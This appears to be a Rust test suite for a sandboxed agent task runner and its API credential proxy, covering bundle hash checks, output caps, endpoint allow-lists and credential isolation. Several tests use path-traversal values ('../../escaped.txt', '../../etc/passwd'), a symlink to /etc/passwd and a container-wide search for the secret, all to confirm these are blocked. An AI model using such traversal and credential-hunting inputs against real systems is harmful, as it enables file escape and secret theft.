        // 1. bundle stored under a hash it does not match
        let genuine = input_bundle();
        let hash = archive::sha256_hex(&genuine);
        std::fs::write(f.dir.join("q/bundles").join(&hash), b"tampered").unwrap();
        q.post(&job(&f, &hash, 1000)).unwrap();
        let q: std::sync::Arc<dyn QueueClient> = std::sync::Arc::new(q);
        let mut r = runner(&f, q.clone(), policy());
        assert_eq!(r.tick(Local::now()).unwrap(), Tick::Dropped("t1".into()));
        assert!(r.audit.entries().unwrap()[0].detail.contains("does not match"));

        // 2. bundle missing
        let f2 = fixture("io-missing");
        let q2 = std::sync::Arc::new(InMemoryQueue::default());
        q2.post(job(&f2, &"ab".repeat(32), 1000));
        let mut r2 = runner(&f2, q2, policy());
        assert_eq!(r2.tick(Local::now()).unwrap(), Tick::Dropped("t1".into()));
        assert!(r2.audit.entries().unwrap()[0].detail.contains("not available"));

        // 3. bigger than this runner's limit
        let f3 = fixture("io-big");
        let q3 = std::sync::Arc::new(InMemoryQueue::default());
        let h3 = q3.post_bundle(input_bundle());
        q3.post(job(&f3, &h3, 1000));
        let mut p = policy();
        p.max_input_bytes = 10;
        let mut r3 = runner(&f3, q3, p);
        assert_eq!(r3.tick(Local::now()).unwrap(), Tick::Dropped("t1".into()));
        assert!(r3.audit.entries().unwrap()[0].detail.contains("limit"));

        // 4. malformed hash in the manifest
        let f4 = fixture("io-hash");
        let q4 = std::sync::Arc::new(InMemoryQueue::default());
        q4.post(job(&f4, "not-a-hash", 1000));
        let mut r4 = runner(&f4, q4, policy());
        assert_eq!(r4.tick(Local::now()).unwrap(), Tick::Dropped("t1".into()));

        // 5. unsafe path inside a correctly hashed bundle: nothing is written outside the workspace
        let f5 = fixture("io-evil");
        let q5 = std::sync::Arc::new(InMemoryQueue::default());
        let evil = b"{\"t\":\"file\",\"path\":\"../../escaped.txt\",\"size\":1,\"mode\":420}\nx{\"t\":\"end\"}\n".to_vec();
        let h5 = q5.post_bundle(evil);
        q5.post(job(&f5, &h5, 1000));
        let mut r5 = runner(&f5, q5, policy());
        assert_eq!(r5.tick(Local::now()).unwrap(), Tick::Dropped("t1".into()));
        assert!(!f5.dir.join("escaped.txt").exists() && !f5.dir.parent().unwrap().join("escaped.txt").exists());
    }

    #[test]
    fn artifacts_over_the_cap_fail_the_task() {
        let f = fixture("io-cap");
        let q = std::sync::Arc::new(InMemoryQueue::default());
        let hash = q.post_bundle(input_bundle());
        q.post(job(&f, &hash, 3)); // "created" alone is 7 bytes
        let mut r = runner(&f, q.clone(), policy());
        assert_eq!(r.tick(Local::now()).unwrap(), Tick::Dropped("t1".into()));
        assert!(q.results().is_empty());
        let _: Option<SigningKey> = None;
    }

    #[test]
    fn dirqueue_stores_bundles_by_hash() {
        let f = fixture("io-dirq");
        let q = DirQueue::new(f.dir.join("q")).unwrap();
        let h = q.post_bundle(b"data").unwrap();
        assert_eq!(h, archive::sha256_hex(b"data"));
        assert_eq!(q.bundle(&h).unwrap().unwrap(), b"data");
        assert_eq!(q.bundle(&"f".repeat(64)).unwrap(), None);
        assert!(q.bundle("../../etc/passwd").is_err(), "hash must be hex");
    }

    #[test]
    fn container_roundtrip() {
        let docker_ok = std::process::Command::new("docker").args(["image", "inspect", "alpine"]).output().is_ok_and(|o| o.status.success());
        if !docker_ok {
            eprintln!("skipping: needs docker and alpine");
            return;
        }
        let f = fixture("io-docker");
        let t = task("io1", "a", 1, &f.key_a);
        let sb = { let mut sb = DockerSandbox::new(); sb.environments.insert("a".into(), crate::sandbox::Environment { image: "alpine".into(), network: false }); sb };
        let ws = sb.create(&t, &t.sandbox_profile).unwrap();
        sb.put_inputs(&ws, &input_bundle(), 1 << 20).unwrap();
        let sh = |c: &str| crate::sandbox::exec(&ws, &["sh", "-c", c], std::time::Duration::from_secs(20)).unwrap();
        assert_eq!(String::from_utf8_lossy(&sh("cat /workspace/src/a.txt").stdout), "A", "inputs unpacked as the unprivileged user");
        assert!(sh("echo edited >> /workspace/src/a.txt; rm /workspace/old.txt; echo n > /workspace/new.txt; ln -s /etc/passwd /workspace/sneaky").status.success());
        let out = sb.collect_outputs(&ws, 1 << 20).unwrap();
        let mut recs = archive::from_bytes(&out, Limits::new(1 << 20)).unwrap();
        recs.sort_by_key(path_of);
        assert_eq!(recs, vec![file("new.txt", "n\n"), Record::Deleted { path: "old.txt".into() }, file("src/a.txt", "Aedited\n")], "symlink not collected");
        assert!(sb.collect_outputs(&ws, 2).is_err(), "cap enforced inside the container");
        let e = sb.put_inputs(&ws, b"garbage", 1 << 20);
        assert!(e.is_err(), "malformed bundles are refused inside the container too");
        sb.destroy(ws).unwrap();
    }
}

mod dsse_spec {
    use crate::dsse::{pae, sign};

    #[test]
    fn pae_matches_the_spec_example() {
        // From the DSSE specification: PAE("http://example.com/HelloWorld", "hello world").
        assert_eq!(pae("http://example.com/HelloWorld", b"hello world"), b"DSSEv1 29 http://example.com/HelloWorld 11 hello world");
        assert_eq!(pae("", b""), b"DSSEv1 0  0 ", "empty type and body");
        assert_eq!(pae("t", "héllo".as_bytes()), "DSSEv1 1 t 6 héllo".as_bytes(), "lengths are in bytes, not characters");
    }

    #[test]
    fn envelope_json_has_the_spec_field_names() {
        let key = crate::manifest::generate_key();
        let env = sign("application/vnd.toto.task+json", b"{}", &key);
        let v: serde_json::Value = serde_json::to_value(&env).unwrap();
        assert!(v["payloadType"].is_string() && v["payload"].is_string() && v["signatures"][0]["sig"].is_string());
        assert_eq!(v["signatures"][0]["keyid"], hex::encode(key.verifying_key().to_bytes()));
        env.verify("application/vnd.toto.task+json", &key.verifying_key()).unwrap();
    }
}

mod proxy {
    use super::fixture;
    use crate::proxy::{Auth, AuthProxy};
    use std::io::{BufRead, BufReader, Read, Write};
    use std::os::unix::fs::PermissionsExt;
    use std::os::unix::net::UnixStream;
    use std::sync::{Arc, Mutex};

    #[derive(Clone, Debug)]
    pub(super) struct Seen {
        method: String,
        path: String,
        headers: Vec<(String, String)>,
        body: Vec<u8>,
    }

    impl Seen {
        fn header(&self, k: &str) -> Vec<&str> {
            self.headers.iter().filter(|(n, _)| n == k).map(|(_, v)| v.as_str()).collect()
        }
    }

    /// A fake API origin that records requests and answers every one with the same response.
    fn upstream(status: u16, ctype: &'static str, body: Vec<u8>) -> (String, Arc<Mutex<Vec<Seen>>>) {
        upstream_with(status, ctype, "", body)
    }

    /// Like `upstream`, with extra response header lines (`k: v\r\n`).
    pub(super) fn upstream_with(status: u16, ctype: &'static str, extra: &'static str, body: Vec<u8>) -> (String, Arc<Mutex<Vec<Seen>>>) {
        let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let url = format!("http://{}", l.local_addr().unwrap());
        let seen = Arc::new(Mutex::new(Vec::new()));
        let log = seen.clone();
        std::thread::spawn(move || {
            for s in l.incoming().flatten() {
                let mut r = BufReader::new(s.try_clone().unwrap());
                let mut line = String::new();
                r.read_line(&mut line).unwrap();
                let mut p = line.split_whitespace();
                let (method, path) = (p.next().unwrap_or("").to_string(), p.next().unwrap_or("").to_string());
                let mut headers = vec![];
                loop {
                    let mut h = String::new();
                    r.read_line(&mut h).unwrap();
                    if h.trim().is_empty() {
                        break;
                    }
                    if let Some((k, v)) = h.split_once(':') {
                        headers.push((k.trim().to_ascii_lowercase(), v.trim().to_string()));
                    }
                }
                let len: usize = headers.iter().find(|(k, _)| k == "content-length").and_then(|(_, v)| v.parse().ok()).unwrap_or(0);
                let mut b = vec![0u8; len];
                r.read_exact(&mut b).unwrap();
                log.lock().unwrap().push(Seen { method, path, headers, body: b });
                let mut s = s;
                let _ = write!(s, "HTTP/1.1 {status} X\r\ncontent-type: {ctype}\r\ncontent-length: {}\r\n{extra}connection: close\r\n\r\n", body.len());
                let _ = s.write_all(&body);
            }
        });
        (url, seen)
    }

    #[test]
    fn the_quota_signal_is_read_from_every_upstream_response() {
        let f = fixture("px-quota");
        let (url, _) = upstream_with(200, "application/json", "anthropic-ratelimit-unified-status: allowed_warning\r\nanthropic-ratelimit-unified-5h-utilization: 0.93\r\nanthropic-ratelimit-unified-5h-reset: 1900000000\r\nanthropic-ratelimit-unified-7d-utilization: 0.4\r\n", b"{}".to_vec());
        let p = start(&f, &url, Auth::Bearer { token: "T".into(), oauth: true });
        assert!(p.quota().is_none(), "nothing known before the first request");
        call(p.socket(), &post("/v1/messages", "", "{}"));
        let q = p.quota().unwrap();
        assert_eq!((q.status, q.limited, q.utilization, q.resets_at), (200, false, Some(0.93), Some(1900000000)));
        let (url, _) = upstream_with(429, "application/json", "retry-after: 30\r\n", br#"{"type":"error","error":{"type":"rate_limit_error"}}"#.to_vec());
        let f2 = fixture("px-quota-429");
        let p2 = start(&f2, &url, Auth::ApiKey("K".into()));
        let (st, _) = call(p2.socket(), &post("/v1/messages", "", "{}"));
        assert_eq!(st, 429, "the refusal passes through to the agent as is");
        let q = p2.quota().unwrap();
        assert!(q.limited && q.retry_after == Some(30) && q.describe().contains("refused"), "{q:?}");
    }

    /// Sends a raw request over the unix socket and returns (status, body).
    fn call(sock: &std::path::Path, raw: &[u8]) -> (u16, Vec<u8>) {
        let mut s = UnixStream::connect(sock).unwrap();
        s.write_all(raw).unwrap();
        let mut out = Vec::new();
        let _ = s.read_to_end(&mut out);
        let text = String::from_utf8_lossy(&out).to_string();
        let status = text.split_whitespace().nth(1).and_then(|s| s.parse().ok()).unwrap_or(0);
        let body = out.windows(4).position(|w| w == b"\r\n\r\n").map_or(vec![], |i| out[i + 4..].to_vec());
        (status, body)
    }

    fn post(path: &str, headers: &str, body: &str) -> Vec<u8> {
        format!("POST {path} HTTP/1.1\r\nhost: x\r\ncontent-length: {}\r\n{headers}\r\n{body}", body.len()).into_bytes()
    }

    fn start(f: &super::Fixture, upstream: &str, auth: Auth) -> AuthProxy {
        let dir = f.dir.join("sock");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700)).unwrap();
        AuthProxy::start(&dir.join("p.sock"), upstream, crate::proxy::Provider::Anthropic, auth).unwrap()
    }

    const SSE: &str = "event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"m\",\"usage\":{\"input_tokens\":10,\"cache_creation_input_tokens\":5,\"cache_read_input_tokens\":999,\"output_tokens\":1}}}\n\nevent: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"delta\":{\"type\":\"text_delta\",\"text\":\"hi\"}}\n\nevent: message_delta\ndata: {\"type\":\"message_delta\",\"usage\":{\"output_tokens\":20}}\n\nevent: message_stop\ndata: {\"type\":\"message_stop\"}\n\n";

    #[test]
    fn real_credential_replaces_whatever_the_client_sends() {
        let f = fixture("px-auth");
        let (url, seen) = upstream(200, "application/json", b"{}".to_vec());
        let p = start(&f, &url, Auth::Bearer { token: "REAL-TOKEN".into(), oauth: false });
        let hdr = "authorization: Bearer dummy-from-container\r\nx-api-key: also-dummy\r\ncookie: session=steal\r\nproxy-authorization: Basic x\r\nanthropic-version: 2023-06-01\r\nx-app: cli\r\n";
        let (st, _) = call(p.socket(), &post("/v1/messages?beta=true", hdr, r#"{"model":"m"}"#));
        assert_eq!(st, 200);
        let s = seen.lock().unwrap()[0].clone();
        assert_eq!((s.method.as_str(), s.path.as_str()), ("POST", "/v1/messages?beta=true"));
        assert_eq!(s.header("authorization"), ["Bearer REAL-TOKEN"], "exactly one credential, the real one");
        assert!(s.header("x-api-key").is_empty() && s.header("cookie").is_empty() && s.header("proxy-authorization").is_empty(), "{:?}", s.headers);
        assert!(!format!("{:?}", s.headers).contains("dummy"));
        assert_eq!((s.header("anthropic-version"), s.header("x-app")), (vec!["2023-06-01"], vec!["cli"]), "other headers pass through");
        assert_eq!(s.header("accept-encoding"), ["identity"], "so usage can be read");
        assert_eq!(s.body, br#"{"model":"m"}"#);
        assert!(s.header("anthropic-beta").is_empty(), "no oauth flag for a plain bearer");
    }

    #[test]
    fn oauth_adds_its_beta_flag_once_and_api_keys_use_x_api_key() {
        let f = fixture("px-modes");
        let (url, seen) = upstream(200, "application/json", b"{}".to_vec());
        let p = start(&f, &url, Auth::Bearer { token: "T".into(), oauth: true });
        call(p.socket(), &post("/v1/messages", "anthropic-beta: claude-code-20250219, effort-2025-11-24\r\n", "{}"));
        call(p.socket(), &post("/v1/messages", "anthropic-beta: oauth-2025-04-20\r\n", "{}"));
        let s = seen.lock().unwrap().clone();
        assert_eq!(s[0].header("anthropic-beta"), ["claude-code-20250219,effort-2025-11-24,oauth-2025-04-20"]);
        assert_eq!(s[1].header("anthropic-beta"), ["oauth-2025-04-20"], "not duplicated");
        let f2 = fixture("px-key");
        let (url2, seen2) = upstream(200, "application/json", b"{}".to_vec());
        let p2 = start(&f2, &url2, Auth::ApiKey("sk-ant-api-REAL".into()));
        call(p2.socket(), &post("/v1/messages", "authorization: Bearer nope\r\n", "{}"));
        let s2 = seen2.lock().unwrap()[0].clone();
        assert_eq!((s2.header("x-api-key"), s2.header("authorization")), (vec!["sk-ant-api-REAL"], vec![]));
    }

    #[test]
    fn only_the_messages_endpoints_are_forwarded() {
        let f = fixture("px-allow");
        let (url, seen) = upstream(200, "application/json", b"{}".to_vec());
        let p = start(&f, &url, Auth::ApiKey("K".into()));
        let get = |path: &str| call(p.socket(), format!("GET {path} HTTP/1.1\r\nhost: x\r\n\r\n").as_bytes()).0;
        for path in ["/v1/models", "/v1/messages", "/v1/organizations/me", "/v1/files", "/", "//v1/messages", "/v1/messages/../models"] {
            assert_eq!(get(path), 403, "GET {path}");
        }
        for path in ["/v1/complete", "/v1/messages/batches", "/v1/messages/../models", "/v1/messages%2F..%2Fmodels", "/v1/messages/count_tokens/x"] {
            assert_eq!(call(p.socket(), &post(path, "", "{}")).0, 403, "POST {path}");
        }
        assert_eq!(call(p.socket(), &post("/v1/messages/count_tokens", "", "{}")).0, 200, "count_tokens is allowed");
        assert_eq!(seen.lock().unwrap().len(), 1, "nothing else reached upstream");
        // the local connectivity check never reaches upstream either
        let (st, _) = call(p.socket(), b"HEAD /api/hello HTTP/1.1\r\nhost: x\r\n\r\n");
        assert_eq!(st, 200);
        assert_eq!(seen.lock().unwrap().len(), 1);
    }

    #[test]
    fn streamed_responses_pass_through_and_tokens_are_counted() {
        let f = fixture("px-sse");
        let (url, _) = upstream(200, "text/event-stream", SSE.as_bytes().to_vec());
        let p = start(&f, &url, Auth::ApiKey("K".into()));
        let (st, body) = call(p.socket(), &post("/v1/messages", "", r#"{"stream":true}"#));
        assert_eq!(st, 200);
        assert_eq!(String::from_utf8(body).unwrap(), SSE, "byte-exact passthrough");
        assert_eq!(p.tokens(), 10 + 5 + 20, "input + cache creation + final output; cache reads excluded");
        call(p.socket(), &post("/v1/messages", "", "{}"));
        assert_eq!((p.tokens(), p.requests()), (70, 2), "accumulates across requests");

        let f2 = fixture("px-json");
        let json = br#"{"id":"m","usage":{"input_tokens":7,"cache_creation_input_tokens":3,"output_tokens":4}}"#.to_vec();
        let (url2, _) = upstream(200, "application/json", json);
        let p2 = start(&f2, &url2, Auth::ApiKey("K".into()));
        call(p2.socket(), &post("/v1/messages", "", "{}"));
        assert_eq!(p2.tokens(), 14, "non-streamed responses are counted too");
    }

    #[test]
    fn upstream_errors_pass_through_and_failures_do_not_hang() {
        let f = fixture("px-err");
        let (url, _) = upstream(401, "application/json", br#"{"type":"error","error":{"type":"authentication_error"}}"#.to_vec());
        let p = start(&f, &url, Auth::ApiKey("K".into()));
        let (st, body) = call(p.socket(), &post("/v1/messages", "", "{}"));
        assert_eq!(st, 401);
        assert!(String::from_utf8_lossy(&body).contains("authentication_error"));
        assert_eq!(p.tokens(), 0);
        let f2 = fixture("px-down");
        let p2 = start(&f2, "http://127.0.0.1:9", Auth::ApiKey("K".into())); // nothing listens on :9
        let (st2, body2) = call(p2.socket(), &post("/v1/messages", "", "{}"));
        assert_eq!(st2, 502);
        assert!(!String::from_utf8_lossy(&body2).contains("K\""), "no secret in error bodies");
    }

    #[test]
    fn oversized_and_chunked_requests_are_refused_before_forwarding() {
        let f = fixture("px-limits");
        let (url, seen) = upstream(200, "application/json", b"{}".to_vec());
        let p = start(&f, &url, Auth::ApiKey("K".into()));
        let huge = b"POST /v1/messages HTTP/1.1\r\nhost: x\r\ncontent-length: 999999999\r\n\r\n";
        assert_eq!(call(p.socket(), huge).0, 413);
        let chunked = b"POST /v1/messages HTTP/1.1\r\nhost: x\r\ntransfer-encoding: chunked\r\n\r\n0\r\n\r\n";
        assert_eq!(call(p.socket(), chunked).0, 400);
        assert_eq!(call(p.socket(), b"garbage\r\n\r\n").0, 403);
        assert!(seen.lock().unwrap().is_empty());
    }

    #[test]
    fn socket_is_reachable_from_a_container_and_removed_on_stop() {
        let f = fixture("px-sock");
        let (url, _) = upstream(200, "application/json", b"{}".to_vec());
        let p = start(&f, &url, Auth::ApiKey("K".into()));
        let sock = p.socket().to_path_buf();
        assert_eq!(std::fs::metadata(&sock).unwrap().permissions().mode() & 0o777, 0o666, "connectable through a bind mount by the container user");
        assert_eq!(std::fs::metadata(sock.parent().unwrap()).unwrap().permissions().mode() & 0o777, 0o700, "but the directory keeps other host users out");
        p.stop();
        assert!(!sock.exists());
    }

    const RESPONSES_SSE: &str = "event: response.created\ndata: {\"type\":\"response.created\",\"response\":{\"id\":\"resp_1\",\"status\":\"in_progress\"}}\n\nevent: response.output_text.delta\ndata: {\"type\":\"response.output_text.delta\",\"delta\":\"hi\"}\n\nevent: response.completed\ndata: {\"type\":\"response.completed\",\"response\":{\"id\":\"resp_1\",\"status\":\"completed\",\"usage\":{\"input_tokens\":100,\"input_tokens_details\":{\"cached_tokens\":40},\"output_tokens\":20,\"total_tokens\":120}}}\n\n";

    fn start_openai(f: &super::Fixture, upstream: &str) -> AuthProxy {
        let dir = f.dir.join("sock");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700)).unwrap();
        AuthProxy::start(&dir.join("p.sock"), upstream, crate::proxy::Provider::OpenAi, Auth::Bearer { token: "sk-REAL-OPENAI".into(), oauth: false }).unwrap()
    }

    #[test]
    fn openai_profile_has_its_own_endpoints_credential_and_usage_format() {
        let f = fixture("px-openai");
        let (url, seen) = upstream(200, "text/event-stream", RESPONSES_SSE.as_bytes().to_vec());
        let p = start_openai(&f, &url);
        let hdr = "authorization: Bearer dummy-from-container\r\nx-api-key: dummy\r\nchatgpt-account-id: someone-else\r\nx-codex-turn-metadata: {}\r\n";
        let (st, body) = call(p.socket(), &post("/v1/responses", hdr, r#"{"stream":true}"#));
        assert_eq!(st, 200);
        assert_eq!(String::from_utf8(body).unwrap(), RESPONSES_SSE, "byte-exact passthrough");
        let s = seen.lock().unwrap()[0].clone();
        assert_eq!(s.header("authorization"), ["Bearer sk-REAL-OPENAI"]);
        assert!(s.header("x-api-key").is_empty() && s.header("anthropic-beta").is_empty(), "{:?}", s.headers);
        assert_eq!(s.header("x-codex-turn-metadata"), ["{}"], "client metadata headers pass through");
        assert_eq!(p.tokens(), 120, "input (cached tokens already included) + output");
        // other endpoints, including the Anthropic ones, are refused
        for path in ["/v1/messages", "/v1/chat/completions", "/v1/models", "/v1/files", "/v1/responses/resp_1", "/v1/responses/../models"] {
            assert_eq!(call(p.socket(), &post(path, "", "{}")).0, 403, "POST {path}");
        }
        assert_eq!(call(p.socket(), "GET /v1/responses HTTP/1.1\r\nhost: x\r\n\r\n".to_string().as_bytes()).0, 403);
        assert_eq!(seen.lock().unwrap().len(), 1);
    }

    #[test]
    fn openai_usage_from_plain_and_incomplete_responses() {
        let f = fixture("px-openai-json");
        let (url, _) = upstream(200, "application/json", br#"{"id":"resp_2","usage":{"input_tokens":7,"output_tokens":5,"total_tokens":12}}"#.to_vec());
        let p = start_openai(&f, &url);
        call(p.socket(), &post("/v1/responses", "", "{}"));
        assert_eq!(p.tokens(), 12);
        let f2 = fixture("px-openai-incomplete");
        let incomplete = "event: response.incomplete\ndata: {\"type\":\"response.incomplete\",\"response\":{\"usage\":{\"input_tokens\":9,\"output_tokens\":1}}}\n\n";
        let (url2, _) = upstream(200, "text/event-stream", incomplete.as_bytes().to_vec());
        let p2 = start_openai(&f2, &url2);
        call(p2.socket(), &post("/v1/responses", "", "{}"));
        assert_eq!(p2.tokens(), 10, "a cut-off response is still billed");
    }

    #[test]
    fn secrets_are_not_printable() {
        let a = Auth::Bearer { token: "SECRET-VALUE".into(), oauth: true };
        assert!(!format!("{a:?}").contains("SECRET"));
        assert!(!format!("{:?}", Auth::ApiKey("SECRET-VALUE".into())).contains("SECRET"));
    }
}

mod proxy_container {
    use super::{fixture, task};
    use crate::proxy::{Auth, AuthProxy};
    use crate::sandbox::{exec, DockerSandbox, Sandbox};
    use std::io::{BufRead, BufReader, Read, Write};
    use std::os::unix::fs::PermissionsExt;
    use std::sync::{Arc, Mutex};
    use std::time::Duration;

    pub fn docker_has(image: &str) -> bool {
        std::process::Command::new("docker").args(["image", "inspect", image]).output().is_ok_and(|o| o.status.success())
    }

    /// Fake API origin recording the auth headers it receives.
    pub type SeenHeaders = Arc<Mutex<Vec<Vec<(String, String)>>>>;

    pub fn fake_api(body: &'static str, ctype: &'static str) -> (String, SeenHeaders) {
        let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let url = format!("http://{}", l.local_addr().unwrap());
        let seen = Arc::new(Mutex::new(Vec::new()));
        let log = seen.clone();
        std::thread::spawn(move || {
            for s in l.incoming().flatten() {
                let mut r = BufReader::new(s.try_clone().unwrap());
                let mut first = String::new();
                r.read_line(&mut first).unwrap();
                let mut headers = vec![("path".to_string(), first.split_whitespace().nth(1).unwrap_or("").to_string())];
                loop {
                    let mut h = String::new();
                    r.read_line(&mut h).unwrap();
                    if h.trim().is_empty() {
                        break;
                    }
                    if let Some((k, v)) = h.split_once(':') {
                        headers.push((k.trim().to_ascii_lowercase(), v.trim().to_string()));
                    }
                }
                let len: usize = headers.iter().find(|(k, _)| k == "content-length").and_then(|(_, v)| v.parse().ok()).unwrap_or(0);
                let mut b = vec![0u8; len];
                r.read_exact(&mut b).unwrap();
                log.lock().unwrap().push(headers);
                let mut s = s;
                let _ = write!(s, "HTTP/1.1 200 OK\r\ncontent-type: {ctype}\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}", body.len());
            }
        });
        (url, seen)
    }

    #[test]
    fn container_reaches_only_the_proxy_and_never_sees_the_credential() {
        if !docker_has("toto-omnigent-test") {
            eprintln!("skipping: needs docker and the toto-omnigent-test image (python3 for the relay)");
            return;
        }
        let f = fixture("pxc");
        let (url, seen) = fake_api(r#"{"usage":{"input_tokens":3,"output_tokens":4}}"#, "application/json");
        let dir = f.dir.join("sock");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700)).unwrap();
        let proxy = AuthProxy::start(&dir.join("p.sock"), &url, crate::proxy::Provider::Anthropic, Auth::Bearer { token: "REAL-SECRET-TOKEN".into(), oauth: false }).unwrap();

        let t = task("pxc1", "a", 1, &f.key_a);
        let mut sb = { let mut sb = DockerSandbox::new(); sb.environments.insert("a".into(), crate::sandbox::Environment { image: "toto-omnigent-test".into(), network: false }); sb };
        sb.proxy_socket = Some(proxy.socket().to_path_buf());
        let ws = sb.create(&t, &t.sandbox_profile).unwrap();
        let sh = |c: &str| exec(&ws, &["sh", "-c", c], Duration::from_secs(20)).unwrap();
        // The image has python3 (as every toto image must) and nothing like wget; `req METHOD URL`
        // exits non-zero on any error or non-2xx status.
        const REQ: &str = "req() { python3 -c \"import sys,urllib.request as u; r=u.urlopen(u.Request(sys.argv[2], data=(b'{}' if sys.argv[1]=='POST' else None), headers={'authorization':'Bearer dummy-in-container','x-api-key':'dummy2'}, method=sys.argv[1]), timeout=3); sys.stdout.write(r.read().decode())\" \"$@\"; }; ";

        // 1. a request through the relay reaches upstream with the REAL credential, not the dummy
        let out = sh(&format!("{REQ}req POST http://127.0.0.1:8080/v1/messages"));
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
        assert!(String::from_utf8_lossy(&out.stdout).contains("input_tokens"));
        let h = seen.lock().unwrap()[0].clone();
        let get = |k: &str| h.iter().filter(|(n, _)| n == k).map(|(_, v)| v.clone()).collect::<Vec<_>>();
        assert_eq!(get("authorization"), ["Bearer REAL-SECRET-TOKEN"]);
        assert!(get("x-api-key").is_empty());
        assert_eq!(proxy.tokens(), 7);

        // 2. the credential is not anywhere in the container: environment, mounts, filesystem
        let hay = sh("env; cat /proc/mounts; find / -xdev -type f -size -64k 2>/dev/null | head -2000 | xargs grep -l REAL-SECRET 2>/dev/null; echo done");
        assert!(!String::from_utf8_lossy(&hay.stdout).contains("REAL-SECRET"), "credential leaked into the container");

        // 3. the container still has no network: only the relay is reachable, and only the allowed calls pass
        assert!(!sh(&format!("{REQ}req GET http://1.1.1.1")).status.success(), "no outside network");
        assert!(!sh(&format!("{REQ}req GET http://127.0.0.1:9999/")).status.success(), "no other loopback service");
        assert!(!sh(&format!("{REQ}req GET http://127.0.0.1:8080/v1/models")).status.success(), "the proxy refuses other endpoints (403)");
        assert_eq!(seen.lock().unwrap().len(), 1, "upstream saw only the allowed request");
        sb.destroy(ws).unwrap();
    }
}

mod omnigent_in_container {
    use super::proxy_container::docker_has;
    use super::{fixture, task};
    use crate::proxy::{Auth, AuthProxy};
    use crate::sandbox::{DockerSandbox, Sandbox, Workspace};
    use std::io::{BufRead, BufReader, Read, Write};
    use std::os::unix::fs::PermissionsExt;
    use std::sync::{Arc, Mutex};

    fn sse(blocks: &str, stop: &str, out: u64) -> String {
        format!("event: message_start\ndata: {{\"type\":\"message_start\",\"message\":{{\"id\":\"msg_1\",\"type\":\"message\",\"role\":\"assistant\",\"model\":\"claude-fake\",\"content\":[],\"stop_reason\":null,\"stop_sequence\":null,\"usage\":{{\"input_tokens\":25,\"output_tokens\":1}}}}}}\n\n{blocks}event: message_delta\ndata: {{\"type\":\"message_delta\",\"delta\":{{\"stop_reason\":\"{stop}\",\"stop_sequence\":null}},\"usage\":{{\"output_tokens\":{out}}}}}\n\nevent: message_stop\ndata: {{\"type\":\"message_stop\"}}\n\n")
    }

    fn text(t: &str) -> String {
        sse(&format!("event: content_block_start\ndata: {{\"type\":\"content_block_start\",\"index\":0,\"content_block\":{{\"type\":\"text\",\"text\":\"\"}}}}\n\nevent: content_block_delta\ndata: {{\"type\":\"content_block_delta\",\"index\":0,\"delta\":{{\"type\":\"text_delta\",\"text\":\"{t}\"}}}}\n\nevent: content_block_stop\ndata: {{\"type\":\"content_block_stop\",\"index\":0}}\n\n"), "end_turn", 12)
    }

    type Bodies = Arc<Mutex<Vec<(Vec<(String, String)>, String)>>>;

    fn tool_use_named(id: &str, name: &str, input: &serde_json::Value) -> String {
        let partial = serde_json::to_string(&input.to_string()).unwrap();
        sse(&format!("event: content_block_start\ndata: {{\"type\":\"content_block_start\",\"index\":0,\"content_block\":{{\"type\":\"tool_use\",\"id\":\"{id}\",\"name\":\"{name}\",\"input\":{{}}}}}}\n\nevent: content_block_delta\ndata: {{\"type\":\"content_block_delta\",\"index\":0,\"delta\":{{\"type\":\"input_json_delta\",\"partial_json\":{partial}}}}}\n\nevent: content_block_stop\ndata: {{\"type\":\"content_block_stop\",\"index\":0}}\n\n"), "tool_use", 30)
    }

    /// A fake model that performs `script` (one tool call per step, advancing as tool results
    /// come back) once it sees RUN-THE-TOOL, then answers DONE-FROM-FAKE-API.
    fn fake_scripted(script: Vec<(&'static str, serde_json::Value)>) -> (String, Bodies) {
        let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let url = format!("http://{}", l.local_addr().unwrap());
        let seen: Bodies = Arc::new(Mutex::new(Vec::new()));
        let log = seen.clone();
        std::thread::spawn(move || {
            for s in l.incoming().flatten() {
                let (log, script) = (log.clone(), script.clone());
                std::thread::spawn(move || {
                    let mut r = BufReader::new(s.try_clone().unwrap());
                    let mut first = String::new();
                    if r.read_line(&mut first).unwrap_or(0) == 0 {
                        return;
                    }
                    let mut headers = vec![("path".to_string(), first.split_whitespace().nth(1).unwrap_or("").to_string())];
                    loop {
                        let mut h = String::new();
                        r.read_line(&mut h).unwrap();
                        if h.trim().is_empty() {
                            break;
                        }
                        if let Some((k, v)) = h.split_once(':') {
                            headers.push((k.trim().to_ascii_lowercase(), v.trim().to_string()));
                        }
                    }
                    let len: usize = headers.iter().find(|(k, _)| k == "content-length").and_then(|(_, v)| v.parse().ok()).unwrap_or(0);
                    let mut b = vec![0u8; len];
                    r.read_exact(&mut b).unwrap();
                    let body = String::from_utf8_lossy(&b).to_string();
                    log.lock().unwrap().push((headers, body.clone()));
                    let step = body.matches("\"type\":\"tool_result\"").count();
                    let (ctype, payload) = if !body.contains("\"stream\":true") {
                        ("application/json", r#"{"id":"msg_x","type":"message","role":"assistant","model":"claude-fake","content":[{"type":"text","text":"ok"}],"stop_reason":"end_turn","stop_sequence":null,"usage":{"input_tokens":3,"output_tokens":2}}"#.to_string())
                    } else if body.contains("RUN-THE-TOOL") && step < script.len() {
                        let (name, input) = &script[step];
                        ("text/event-stream", tool_use_named(&format!("toolu_{step}"), name, input))
                    } else if body.contains("RUN-THE-TOOL") {
                        ("text/event-stream", text("DONE-FROM-FAKE-API"))
                    } else {
                        ("text/event-stream", text("ok"))
                    };
                    let mut s = s;
                    let _ = write!(s, "HTTP/1.1 200 OK\r\ncontent-type: {ctype}\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{payload}", payload.len());
                });
            }
        });
        (url, seen)
    }

    /// An Omnigent agent directory as a project would commit it.
    pub fn agent_dir(harness: &str, model: &str, extra_yaml: &str, skills: &[(&str, &str)]) -> std::collections::BTreeMap<String, Vec<u8>> {
        let mut files = std::collections::BTreeMap::new();
        let cfg = format!(
